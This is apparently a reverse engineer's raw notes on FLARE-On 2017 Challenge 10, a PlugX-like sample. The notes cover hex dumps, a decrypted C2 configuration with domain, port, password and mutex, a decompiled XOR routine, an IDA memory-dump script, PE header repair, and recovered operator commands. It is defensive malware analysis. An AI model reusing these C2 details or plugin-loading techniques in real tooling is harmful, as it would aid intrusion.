+0002cc10: 155b bf4a 1efe 1517 7346 04b9 d42b 80e8  .[.J....sF...+..
+0002cc20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0002cc30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+0002cc40: 8ab4 8059 f23a 0800 3600 0000 3600 0000  ...Y.:..6...6...
+0002cc50: 000c 298a 49e4 0050 56e8 99ee 0800 4500  ..).I..PV.....E.
+0002cc60: 0028 f2e4 0000 8006 0d1f 3400 68c8 c0a8  .(........4.h...
+0002cc70: dd5b 24e3 c298 a280 175a 4ca2 6aa2 5010  .[$......ZL.j.P.
+0002cc80: faf0 217c 0000 8ab4 8059 2b47 0800 ea05  ..!|.....Y+G....
+0002cc90: 0000 ea05 0000 000c 298a 49e4 0050 56e8  ........).I..PV.
+0002cca0: 99ee 0800 4500 05dc f2e5 0000 8006 076a  ....E..........j
+0002ccb0: 3400 68c8 c0a8 dd5b 24e3 c298 a280 175a  4.h....[$......Z
+0002ccc0: 4ca2 6aa2 5010 faf0 52a2 0000 3230 3137  L.j.P...R...2017
+
+
+0002ccf0: 1c00 0000 4440 0000 4440 0000 f371 26ad  ....D@..D@...q&.
+0002cd00: 88a5 617e af06 000d 424c 5a21 1704 1720  ..a~....BLZ!...
+0002cd10: 0600 0000 0600 0000 0000 0000 0000 0000  ................
+0002cd20: 155b bf4a 1efe 1517 7346 04b9 d42b 80e8  .[.J....sF...+..
+0002cd30: c30b 1a2d cb48 9ca8 a724 3764 69cf 6782  ...-.H...$7di.g.
+0002cd40: 4352 5054 00c0 0000 002e 0100 0040 0000  CRPT.........@..
+0002cd50: 0008 0000 740c 3bcb 7516 81ce 0003 0000  ....t.;.u.......
+
+
+000cd7f0: 0000 0000 00f4 6d09 704b 4027 5fb3 3790  ......m.pK@'_.7.
+000cd800: a362 762e 5663 6420 633a 5c77 6f72 6b5c  .bv.Vcd c:\work\
+000cd810: 466c 6172 654f 6e32 3031 375c 4368 616c  FlareOn2017\Chal
+000cd820: 6c65 6e67 655f 3130 0d0a 0005 b580 5996  lenge_10......Y.
+000cd830: 7a08 00b3 0000 00b3 0000 0000 5056 e899  z...........PV..
+
+BOOM!...?
+
+
+
+https://github.com/ctxis/CAPE/blob/ad9efe78df61b727f4c883c572ec0a1adef189d1/analyzer/windows/modules/packages/PlugX.py
+https://github.com/ctxis/CAPE/blob/ad9efe78df61b727f4c883c572ec0a1adef189d1/analyzer/windows/modules/packages/PlugX_zip.py
+https://github.com/ctxis/CAPE/blob/610e263f7f47a61029e96f0266b7cb6342baa9e6/modules/processing/parsers/plugxconfig/plugx.py
+https://www.sans.org/reading-room/whitepapers/detection/gh0st-dshell-decoding-undocumented-protocols-37032
+
+Debugging:
+First loads block of data, prepended with 37 (0x25) to mark # of entries. These are all dwords for API hashes. All are resolved as hashes back into block.
+
+It then loads block of data, decrypts through srand()/rand():
+01385270  60 4D 37 01 00 00 00 00  FE 9F D8 31 01 C8 1A 31  `M7.....þŸØ1.È.1
+01385280  E2 47 3D D8 5E 7A 40 3B  E5 6A E1 7F AA 42 DA 58  âG=Ø^z@;åjá.ªBÚX
+01385290  A7 BA 26 B9 26 26 58 89  88 15 8A 3B 4C B5 7E E8  §º&¹&&X‰ˆ.Š;Lµ~è
+013852A0  DC D7 13 CA 92 E7 92 7F  18 9C D6 C8 44 4C 70 3F  Ü×.Ê’ç’..œÖÈDLp?
+013852B0  50 12 9B 82 76 16 73 93  BC 0E 61 7F 12 05 DA 3E  P.›‚v.s“¼.a...Ú>
+Starts at 0x138527C (01C81A31)
+
+Decrypts to:
+0x0031F6FC
+0031F6F0  10 61 72 00 00 00 00 00  00 00 72 00 17 04 17 20  .ar.......r....
+0031F700  00 00 00 00 E3 24 00 00  70 72 6F 62 61 62 6C 79  ....ã$..probably
+0031F710  2E 73 75 73 70 69 63 69  6F 75 73 2E 74 6F 00 00  .suspicious.to..
+0031F720  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F730  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F740  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F750  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F760  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F770  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F780  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F790  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F7A0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F7B0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F7C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F7D0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F7E0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F7F0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F800  00 00 00 00 00 00 00 00  77 00 65 00 6C 00 63 00  ........w.e.l.c.
+0031F810  6F 00 6D 00 65 00 70 00  61 00 73 00 73 00 31 00  o.m.e.p.a.s.s.1.
+0031F820  21 00 31 00 00 00 00 00  00 00 00 00 00 00 00 00  !.1.............
+0031F830  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F840  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F850  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F860  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F870  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F880  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F890  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F8A0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F8B0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F8C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F8D0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F8E0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F8F0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F900  00 00 00 00 00 00 00 00  66 00 65 00 79 00 65 00  ........f.e.y.e.
+0031F910  32 00 30 00 31 00 37 00  20 00 63 00 6C 00 69 00  2.0.1.7. .c.l.i.
+0031F920  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F930  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F940  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F950  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F960  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F970  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F980  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F990  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F9A0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F9B0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F9C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F9D0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F9E0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031F9F0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031FA00  00 00 00 00 00 00 00 00  61 00 73 00 64 00 6C 00  ........a.s.d.l.
+0031FA10  69 00 75 00 67 00 61 00  73 00 6C 00 64 00 6D 00  i.u.g.a.s.l.d.m.
+0031FA20  67 00 6A 00 00 00 00 00  00 00 00 00 00 00 00 00  g.j.............
+0031FA30  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031FA40  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+0031FA50  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+
+
+struct:
+  int campaign;
+  int unknown;
+  int C2_port;            9443
+  char C2_domain[256];    probably.suspicious.to
+  char C2_password[256];  welcomepass1!1
+  char Unknown2[256];     feye2017 cli
+  char Mutex[256];        asdliugasldmgj
+
+
+Creates a block 2896 bytes big, copies config into it.
+
+Goes into 0x270 (624) loops
+Decrypts to: (First dword (0x1571) == a2 val (5289))
+
+031E1E0  00 00 00 00 00 00 00 00  71 15 00 00 96 EE 98 4D  ........q...–î˜M
+031E1F0  95 F0 25 AF 96 BA D9 AF  68 D0 CB 6F 72 6A D0 2C  •ð%¯–ºÙ¯hÐËorjÐ,
+031E200  00 01 4F 38 07 65 B4 85  01 88 5E 29 6E 31 1B 0D  ..O8.e´….ˆ^)n1..
+031E210  70 5E 30 7B A0 BB B6 BD  F6 B8 EF 1C 1B 9F 49 8B  p^0{ »¶½ö¸ï..ŸI‹
+031E220  EB 25 DF 3F C6 B8 C1 CB  C9 52 B2 38 5E 3A 27 DC  ë%ß?Æ¸ÁËÉR²8^:'Ü
+031E230  C3 CB 40 AE 38 AC E1 6A  91 73 C2 B1 14 44 96 5E  ÃË@®8¬áj‘sÂ±.D–^
+031E240  5F 19 4B 74 2D 50 C6 6B  74 2D 59 67 42 8C B5 19  _.Kt-PÆkt-YgBŒµ.
+031E250  24 A8 7D FA 7E 36 A1 1F  D2 ED 35 66 5C BF 51 B4  $¨}ú~6¡.Òí5f\¿Q´
+031E260  34 CE 3B C7 D2 CA 74 73  5F F0 63 9D D2 99 9A 62  4Î;ÇÒÊts_ðc.Ò™šb
+031E270  61 9B 15 DC CD BF 5B FC  6A EA 79 D0 92 AC 6A 33  a›.ÜÍ¿[üjêyÐ’¬j3
+031E280  C0 37 6E AF B1 D1 A0 90  C7 86 90 5F 47 22 8F 43  À7n¯±Ñ .Ç†._G".C
+031E290  C8 FB B9 B8 DD 70 A5 83  27 DF C5 A3 C6 D6 7E 37  Èû¹¸Ýp¥ƒ'ßÅ£ÆÖ~7
+031E2A0  4C B2 64 2D 2B 04 39 BC  5D 95 D7 2E E2 B2 87 2B  L²d-+.9¼]•×.â²‡+
+031E2B0  5C 85 72 07 7F D9 10 AF  85 B3 74 C4 13 8A C7 66  \…r..Ù.¯…³tÄ.ŠÇf
+031E2C0  50 1B 1B B4 91 A9 8E E7  D2 08 06 EF AE 53 D0 F1  P..´‘©ŽçÒ..ï®SÐñ
+031E2D0  7B 98 B3 29 C2 FB D1 9F  FC 12 D2 4F 0E E3 F5 2A  {˜³)ÂûÑŸü.ÒO.ãõ*
+031E2E0  C4 12 E7 A6 5D 5E A0 8D  BB 12 5F 5B A3 ED 9D E8  Ä.ç¦]^ .»._[£í.è
+031E2F0  62 60 D9 49 52 02 0D DE  39 43 96 CD 27 90 D8 D4  b`ÙIR..Þ9C–Í'.ØÔ
+031E300  7A 22 90 FF 04 5B 9F F3  0B A9 C6 D6 71 F8 0D 0C  z".ÿ.[Ÿó.©ÆÖqø..
+031E310  DF 7D 8E B2 7C ED 9D 60  9D 97 D1 DC A3 5F 26 16  ß}Ž²|í.`.—ÑÜ£_&.
+031E320  9D F6 C6 A7 0A 64 D3 7D  A7 5B 3D 25 34 88 D2 7C  .öÆ§.dÓ}§[=%4ˆÒ|
+031E330  3B 1A 67 FF 6B 50 3D 48  26 74 1F 3B 53 29 9B 5D  ;.gÿkP=H&t.;S)›]
+031E340  B0 2F 92 B0 91 13 11 4B  28 C8 24 0A 21 60 B8 08  °/’°‘..K(È$.!`¸.
+031E350  5F 96 16 A9 0C 18 EC 24  18 E9 57 A2 9F E1 23 70  _–.©..ì$.éW¢Ÿá#p
+031E360  B4 91 37 45 C8 59 D9 63  AD FD 4B F6 07 34 7F 2E  ´‘7EÈYÙc­ýKö.4..
+031E370  25 46 38 CB 61 03 C8 3D  A9 3E 5F 6D AD A0 B3 B5  %F8Ëa.È=©>_m­ ³µ
+031E380  71 0C A5 09 FC 61 DD 24  D4 84 AB 02 0D DC 8C E9  q.¥.üaÝ$Ô„«..ÜŒé
+031E390  F0 4F B8 72 80 83 16 C1  1B FE D7 16 14 B4 F0 F0  ðO¸r€ƒ.Á.þ×..´ðð
+031E3A0  81 5C F8 7F EF FE FC ED  8C DF B0 D1 DC BA 54 D3  .\ø.ïþüíŒß°ÑÜºTÓ
+031E3B0  6D 11 88 E8 D9 BE 04 71  AC E3 E8 78 B6 68 74 8B  m.ˆèÙ¾.q¬ãèx¶ht‹
+031E3C0  7A A3 E1 1D 99 C9 D7 7A  70 E1 2C 95 73 F4 78 21  z£á.™É×zpá,•sôx!
+031E3D0  D9 FC AE 22 18 E3 48 CA  23 0D 08 6A E7 60 22 D8  Ùü®".ãHÊ#..jç`"Ø
+031E3E0  72 3E A6 81 AF 92 10 13  8B 86 D2 3A 58 78 DC 30  r>¦.¯’..‹†Ò:XxÜ0
+031E3F0  3A 93 CA AD 9B 0D 3D A0  E1 3E 8C CF AF C1 29 00  :“Ê­›.= á>ŒÏ¯Á).
+031E400  91 11 E9 88 86 9A 60 3D  66 AD 78 AB FD EC 22 29  ‘.éˆ†š`=f­x«ýì")
+031E410  5B E5 85 22 72 30 0E F0  21 96 9C 4C 2D 5B FE A0  [å…"r0.ð!–œL-[þ 
+031E420  19 21 6F F5 D1 F9 44 2D  05 69 9E C6 EF A5 DD 89  .!oõÑùD-.ižÆï¥Ý‰
+031E430  13 4C B9 87 48 1C 47 F6  2B 4D 3F A2 C2 62 63 4B  .L¹‡H.Gö+M?¢ÂbcK
+031E440  85 52 65 E5 75 45 CD 83  8B 17 6A F4 41 11 2B 39  …ReåuEÍƒ‹.jôA.+9
+031E450  3F 98 00 7F 11 3F 67 BE  1B 0E 02 1D 44 04 19 52  ?˜...?g¾....D..R
+031E460  D7 9C 0A 01 72 F0 FF 14  9A DF C4 EB FE 18 84 09  ×œ..rðÿ.šßÄëþ.„.
+031E470  D8 CA 6F 49 40 29 98 E4  13 23 F2 02 24 02 D2 B7  ØÊoI@)˜ä.#ò.$.Ò·
+031E480  A4 2F 0B 00 5B 90 64 7E  2A 1E 63 99 71 4E 56 42  ¤/..[.d~*.c™qNVB
+031E490  DA E2 16 C1 48 A1 5C 2D  14 2A D3 40 F6 D7 67 97  Úâ.ÁH¡\-.*Ó@ö×g—
+031E4A0  F2 C7 35 26 29 65 D6 6A  78 51 D0 86 D3 6F 20 5E  òÇ5&)eÖjxQÐ†Óo ^
+031E4B0  8C 80 61 25 EF A3 16 81  35 82 23 83 68 CF 32 81  Œ€a%ï£..5‚#ƒhÏ2.
+031E4C0  88 8F F1 8D 29 7C E4 6A  80 64 AE B7 03 3A 25 63  ˆ.ñ.)|äj€d®·.:%c
+031E4D0  84 F5 C8 77 34 0B 50 A0  0A 53 0E 2C AF 1D 5D 89  „õÈw4.P .S.,¯.]‰
+031E4E0  FF 4A 59 D2 2B 72 3F 23  B7 0E 4E 1F F4 BD AC BA  ÿJYÒ+r?#·.N.ô½¬º
+031E4F0  D0 98 89 11 D3 9A C0 7B  9E 77 95 B9 51 AD 3E 4A  Ð˜‰.ÓšÀ{žw•¹Q­>J
+031E500  56 31 AA 52 1A 07 EE BE  40 A5 5C 07 09 73 BC 00  V1ªR..î¾@¥\..s¼.
+031E510  57 34 28 15 1E 36 40 FF  3D DF 15 C8 43 42 CB E7  W4(..6@ÿ=ß.ÈCBËç
+031E520  0E 64 65 09 55 F8 ED 9B  23 8A 2A 5D 3B B2 A2 A4  .de.Uøí›#Š*];²¢¤
+031E530  4F D2 1F F1 CF A4 2C F9  50 31 62 C4 94 E1 67 64  OÒ.ñÏ¤,ùP1bÄ”ágd
+031E540  9F BD C7 3B 92 E7 A0 BD  A8 6C 57 01 21 C7 3B 29  Ÿ½Ç;’ç ½¨lW.!Ç;)
+031E550  DF 39 0D A0 0C 1A 3A 0A  98 B3 30 E7 04 D0 91 93  ß9. ..:.˜³0ç.Ð‘“
+
+
+At .text:003D1FE9 call memcpy, 4 bytes (2017)
+
+
+Let's feed data in with Python, maybe have it decrypt for it?
+Split PCAP sessions, session 0&1, 1 to 20170801_1300_filtered_2.pcap.
+
+
+
+:01035CF0
+First set of packets, decrypted at 01033A50
+int __cdecl XOR_decode(int a1, _BYTE *a2, int a3)
+{
+  unsigned int i; // [esp+10h] [ebp+8h]
+
+  i = ~a1;
+  while ( --a3 )
+    i = dword_104C010[(i ^ *a2++)] ^ (i >> 8);
+  return ~i;
+}
+
+003ACB10  42 00 00 00 38 BD 6E 00  B0 CD 3A 00 6E 35 03 01  B...8½n.°Í:.n5..
+41 loops?
+3ACB14 (38 BD 6E 00) -- 0x6EBD38 = 0x20170417 - xor key
+
+003ACB20  FF FF FF FF 38 BD 6E 00  41 00 00 00 00 00 00 00  ÿÿÿÿ8½n.A.......
+003ACB30  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+003ACB40  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+003ACB50  00 00 00 00 00 00 00 00  80 E0 6E 00 5E 00 00 00  ........€àn.^...
+003ACB60  82 00 00 00 44 D9 04 01  34 D9 04 01 D8 2B 6E 00  ‚...DÙ..4Ù..Ø+n.
+003ACB70  50 DE 3A 00 00 00 00 01  38 BD 6E 00 80 E0 6E 00  PÞ:.....8½n.€àn.
+003ACB80  32 30 31 37 AF F1 81 41  24 00 00 00 5E 00 00 00  2017¯ñ.A$...^...
+003ACB90  5E 00 00 00 51 29 8F 74  16 67 D7 ED 29 41 95 01  ^...Q).t.g×í)A•.
+003ACBA0  06 F5 05 45 5E 00 00 00  42 00 00 00 00 00 00 00  .õ.E^...B.......
+003ACBB0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+003ACBC0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+003ACBD0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+
+
+
+
+start executing at 10PM:
+
+10/03/2017  10:01 PM         2,456,023 secondstage.idb
+10/03/2017  10:01 PM    <DIR>          12
+10/03/2017  10:01 PM    <DIR>          CustomDestinations
+10/03/2017  10:02 PM    <DIR>          staging
+10/03/2017  10:06 PM                12 eaca24ff-236c-401d-a1e7-b3d5267b8a50
+
+It's making staging, but that's it...
+
+Looks like it pulls an exe/dll across, runs through command parser, loads into memory at 0x405702
+
+00150000  4C 4D 00 00 00 00 00 00  00 00 00 00 00 00 00 00  LM..............
+00150010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00150020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00150030  00 00 00 00 00 00 00 00  00 00 00 00 F8 00 00 00  ............ø...
+...
+00165190  0A 20 20 20 20 20 20 3C  2F 72 65 71 75 65 73 74  .      </request
+001651A0  65 64 50 72 69 76 69 6C  65 67 65 73 3E 0D 0A 20  edPrivileges>..
+001651B0  20 20 20 3C 2F 73 65 63  75 72 69 74 79 3E 0D 0A     </security>..
+001651C0  20 20 3C 2F 74 72 75 73  74 49 6E 66 6F 3E 0D 0A    </trustInfo>..
+001651D0  3C 2F 61 73 73 65 6D 62  6C 79 3E 0D 0A 00 00 00  </assembly>.....
+
+Get page beginning, keyword search for "assembly", grab to that area. This could totally be scripted that at X offset of code run this. But, cba
+
+Grab at the start offset of the next 16-byte chunk for clean hash comparison
+
+
+auto fp, ea, fn, start, end;
+fn = "dll8.dat";
+start = 0x00450000;
+end   = 0x004671E0  ;
+fp = fopen(fn, "wb");
+for ( ea=start; ea < end; ea++ )
+  fputc(Byte(ea), fp);
+  return;
+
+DLL1:  0x00220000  0x002351E0
+DLL2:  0x00280000  0x2961E0
+DLL3:  0x002C0000  0x002D61E0
+DLL4:  0x002E0000  0x002F61E0
+DLL5:  0x00300000  0x003261E0
+DLL6:  0x003C0000  0x003DB1E0
+DLL7:  0x003E0000  0x003F81D0
+DLL8:  0x00450000  0x004671E0
+
+
+10/04/2017  10:23 AM            86,496 dll1.dat
+10/04/2017  10:24 AM            90,592 dll2.dat
+10/04/2017  10:26 AM            90,592 dll3.dat
+10/04/2017  10:28 AM            90,592 dll4.dat
+10/04/2017  10:29 AM           287,200 dll5.dat
+10/04/2017  10:30 AM           111,072 dll6.dat
+10/04/2017  10:31 AM            98,768 dll7.dat
+10/04/2017  10:31 AM            94,688 dll8.dat
+
+md5sum:
+c562ada7d75d5a8ed38b8f3978b312af *dll1.dat
+c846c3b19b49a45cd5a1a3a3d05fe89d *dll2.dat
+daf1674598c88888a5fede7010be5107 *dll3.dat
+582931ba2021a9b68078ad249c09adc4 *dll4.dat
+57418f81acfaeb3e40ebebdaad1a423f *dll5.dat
+726cf2227ab1fdcc94a0d66c57d2ddb5 *dll6.dat
+fb92a681c918c82a4bad318f58c1cd14 *dll7.dat
+7292a6663ddb3e7835847dbdb94cf276 *dll8.dat
+
+use Python pefile:
+pefile.PEFormatError: 'DOS Header magic not found.'
+Change LM to MZ
+pefile.PEFormatError: 'Invalid NT Headers signature.'
+
+diff PE headers b/w known good and plugin:
+Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+00000000  50 45 00 00 4C 01 05 00 F3 22 2F 59 00 00 00 00  PE..L...ó"/Y....
+00000000  4E 4F 50 00 33 32 05 00 23 AF 3E 59 00 00 00 00  NOP.32..#¯>Y....
+
+Replace NOP\x0032 with PE\x00\x00L\x01:
+>>> pe = pefile.PE('dll1.dat')
+Boom! It works
+
+
+Dll1.dat:
+
+void __cdecl sub_100087CA(_DWORD *a1)
+{
+  if ( a1 )
+  {
+    sub_10003EE7(a1[1]);
+    sub_10003EE7(a1[2]);
+    sub_10003EE7(a1[3]);
+    ...
+    sub_10003EE7(a1[88]);
+WTF ...
+
+10012490  00 00 72 2E 64 6C 6C 00  00 00 00 00 00 00 00 00  ..r.dll.........
+100124A0  00 00 00 00 00 00 43 72  65 61 74 65 50 6C 75 67  ......CreatePlug
+100124B0  69 6E 4F 62 6A 00 00 00  E0 10 01 00 00 00 00 00  inObj...à.......
+
+DLL1.dat = r.dll
+DLL2.dat = t.dll
+DLL3.dat = 6.dll
+DLL4.dat = x.dll
+DLL5.dat = x.dll
+DLL6.dat = f.dll
+DLL7.dat = s.dll
+DLL8.dat = m.dll
+
+Alright first, broken DLL. Are they all supposed to be that way or am I dumping at wrong spot?
+
+Follow commands again. Starts with 0x0C, checks for date, then loads:
+
+002AD0C0  15 5B BF 4A 1E FE 15 17  73 46 04 B9 D4 2B 80 E8  .[¿J.þ..sF.¹Ô+€è
+002AD0D0  FE D0 E9 A3 1C D1 2A 00  1C 4F 16 00 38 BD 54 00  þÐé£.Ñ*..O..8½T.
+002AD0E0  42 00 00 00 38 BD 54 00  0C 00 00 00 54 D9 17 00  B...8½T.....TÙ..
+002AD0F0  04 D1 2A 00 00 00 00 00  00 00 00 00 00 00 00 00  .Ñ*.............
+
+2nd command: 0x02
+Decodes "CMD" "1.2.0"?  Version?
+Copies block:
+0054DE70  51 29 8F 74 16 67 D7 ED  29 41 95 01 06 F5 05 45  Q).t.g×í)A•..õ.E
+Decodes "CRPT" "1.0.2"
+Copies block:
+0054DF00  00 00 00 00 F3 71 26 AD  88 A5 61 7E AF 06 00 0D  ....óq&­ˆ¥a~¯...
+Decodes "COMP" "1.0.1"
+
+
+Let's try DLL again, but before it's loaded all the way and memcpy'd around.
+0054E170
+0055FF50
+
+Sizes are off, but in good way. No more big page separations
+
+Memory snapshot on former way to get offset/resolutions in memory.
+
+first loaded 002E0000
+take mem snapshot
+second 300000
+
+OK, all loaded side-by-side. Take snapshot, do strings
+
+debug025:00969360 00000056  C (16 bits) Administrator: C:\\Windows\\system32\\cmd.exe
+00969360  41 00 64 00 6D 00 69 00  6E 00 69 00 73 00 74 00  A.d.m.i.n.i.s.t.
+00969370  72 00 61 00 74 00 6F 00  72 00 3A 00 20 00 43 00  r.a.t.o.r.:. .C.
+00969380  3A 00 5C 00 57 00 69 00  6E 00 64 00 6F 00 77 00  :.\.W.i.n.d.o.w.
+00969390  73 00 5C 00 73 00 79 00  73 00 74 00 65 00 6D 00  s.\.s.y.s.t.e.m.
+009693A0  33 00 32 00 5C 00 63 00  6D 00 64 00 2E 00 65 00  3.2.\.c.m.d...e.
+009693B0  78 00 65 00 00 00 2D 00  20 00 63 00 64 00 20 00  x.e...-. .c.d. .
+009693C0  20 00 63 00 3A 00 5C 00  73 00 74 00 61 00 67 00   .c.:.\.s.t.a.g.
+009693D0  69 00 6E 00 67 00 00 00  6E 00 67 00 00 00 6E 00  i.n.g...n.g...n.
+009693E0  32 00 30 00 31 00 37 00  5C 00 43 00 68 00 61 00  2.0.1.7.\.C.h.a.
+009693F0  6C 00 6C 00 65 00 6E 00  67 00 65 00 5F 00 31 00  l.l.e.n.g.e._.1.
+00969400  30 00 00 00 00 F9 FF FF  1D 00 00 00 0B 00 00 00  0....ùÿÿ........
+00969410  30 0B 6C C0 00 F9 FF FF  40 EB 67 C0 00 F9 FF FF  0.lÀ.ùÿÿ@ëgÀ.ùÿÿ
+00969420  00 00 00 00 00 10 00 20  60 F0 00 00 00 00 00 00  ....... `ð......
+
+hmm, in loading plugins:
+.
+
+Switch to API Monitor, hit on NtWriteFile:
+
+
+cd c:\
+dir
+cd c:\work\
+dir
+cd c:\work\FlareOn2017
+dir
+cd c:\work\FlareOn2017\Challenge_10
+dir
+type TODO.txt
+mkdir c:\staging
+cd c:\staging
+
+So why does it stop there? Try to run API Monitor alongside debugger to see actions made by each plugin?
+
+# Time of Day Thread  Module  API Return Value  Error Duration
+824 4:13:18.041 PM  1 cmd.exe GetFileAttributesW ( "c:\work\FlareOn2017\*" )  INVALID_FILE_ATTRIBUTES 123 = The filename, directory name, or volume label syntax is incorrect.  0.0000094
+
+
+Alright, even with that, it ends at cd c:\staging.
+Likely switches plugins, from cmdline to explorer, etc. Network traffic replay is commands only, not output. Need output. Have to write decryptor, FML.
+First, reduce packet down to necessary. Replay just the first few necessary to get a "command" sent, then additional one-at-time to follow commands.
+
+Packet1:
+Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+00000000  32 30 31 37 AF F1 81 41 24 00 00 00 5E 00 00 00  2017¯ñ.A$...^...
+00000010  5E 00 00 00 51 29 8F 74 16 67 D7 ED 29 41 95 01  ^...Q).t.g×í)A•.
+00000020  06 F5 05 45 1C 00 00 00 42 00 00 00 42 00 00 00  .õ.E....B...B...
+00000030  F3 71 26 AD 88 A5 61 7E AF 06 00 0D 42 4C 5A 21  óq&.ˆ¥a~¯...BLZ!
+00000040  17 04 17 20 0E 00 00 00 00 00 00 00 00 00 00 00  ... ............
+00000050  00 00 00 00 15 5B BF 4A 1E FE 15 17 73 46 04 B9  .....[¿J.þ..sF.¹
+00000060  D4 2B 80 E8 77 00 65 00 6C 00 63 00 6F 00 6D 00  Ô+€èw.e.l.c.o.m.
+00000070  65 00 70 00 61 00 73 00 73 00 31 00 21 00 31 00  e.p.a.s.s.1.!.1.
+00000080  00 00                                            ..
+
+At 00405D30, matches byte 20:: against datablock at 41C440
+0041C440  51 29 8F 74 16 67 D7 ED  29 41 95 01 06 F5 05 45  Q).t.g×í)A•..õ.E
+It matches.
+
+006CDF40  1C 00 00 00 42 00 00 00  42 00 00 00 F3 71 26 AD  ....B...B...óq&­
+006CDF50  88 A5 61 7E AF 06 00 0D  42 4C 5A 21 17 04 17 20  ˆ¥a~¯...BLZ!...
+006CDF60  0E 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+006CDF70  15 5B BF 4A 1E FE 15 17  73 46 04 B9 D4 2B 80 E8  .[¿J.þ..sF.¹Ô+€è
+006CDF80  77 00 65 00 6C 00 63 00  6F 00 6D 00 65 00 70 00  w.e.l.c.o.m.e.p.
+006CDF90  61 00 73 00 73 00 31 00  21 00 31 00 00 00        a.s.s.1.!.1...
+
+Second comparison:
+0041C430  F3 71 26 AD 88 A5 61 7E  AF 06 00 0D 42 4C 5A 21  óq&­ˆ¥a~¯...BLZ!
+It matches to end of packet. That leaves:
+
+006CDF40  1C 00 00 00 42 00 00 00  42 00 00 00              ....B...B...
+
+0x42 = size of last part of data
+
+Third comparison for that BLZ! string above. Removes it, gets data after:
+006CBBF0  17 04 17 20 0E 00 00 00  00 00 00 00 00 00 00 00  ... ............
+006CBC00  00 00 00 00 15 5B BF 4A  1E FE 15 17 73 46 04 B9  .....[¿J.þ..sF.¹
+006CBC10  D4 2B 80 E8 77 00 65 00  6C 00 63 00 6F 00 6D 00  Ô+€èw.e.l.c.o.m.
+006CBC20  65 00 70 00 61 00 73 00  73 00 31 00 21 00 31 00  e.p.a.s.s.1.!.1.
+006CBC30  00 00                                             ..
+
+So, now two segments. One check to verify packet, another as a 'split'.
+Sends data2 (welcomepass) into XOR_Decode. XOR's by key (tricksy ,first four bytes are null):
+
+0041C010  00 00 00 00 96 30 07 77  2C 61 0E EE BA 51 09 99
+0041C020  19 C4 6D 07 8F F4 6A 70  35 A5 63 E9 A3 95 64 9E
+0041C030  32 88 DB 0E A4 B8 DC 79  1E E9 D5 E0 88 D9 D2 97
+0041C040  2B 4C B6 09 BD 7C B1 7E  07 2D B8 E7 91 1D BF 90
+0041C050  64 10 B7 1D F2 20 B0 6A  48 71 B9 F3 DE 41 BE 84
+0041C060  7D D4 DA 1A EB E4 DD 6D  51 B5 D4 F4 C7 85 D3 83
+
